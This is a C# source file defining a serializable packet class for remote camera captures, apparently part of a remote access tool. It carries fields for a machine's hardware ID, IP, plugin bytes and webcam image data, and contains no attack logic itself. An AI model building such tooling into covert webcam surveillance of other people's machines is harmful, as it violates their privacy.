using System;

/* 
|| AUTHOR Arsium ||
|| github : https://github.com/arsium       ||
*/

namespace PacketLib.Packet
{
    [Serializable]
    public class RemoteCameraCapturePacket : IPacket
    {
        public RemoteCameraCapturePacket(PacketType packetType) : base()
        {
            this.PacketType = packetType;
        }

        public RemoteCameraCapturePacket(byte[] cameraCapture) : base()
        {
            this.PacketType = PacketType.RC_CAPTURE_ON;

            this.cameraCapture = cameraCapture;
        }

        public string HWID { get; set; }
        public string BaseIp { get; set; }
        public byte[] Plugin { get; set; }
        public PacketType PacketType { get; }
        public PacketState PacketState { get; set; }
        public string Status { get; set; }
        public string DatePacketStatus { get; set; }
        public int PacketSize { get; set; }

        public int quality { get; set; }
        public int index { get; set; }
        public byte[] cameraCapture { get; set; }
        public int timeMS { get; set; }
    }
}
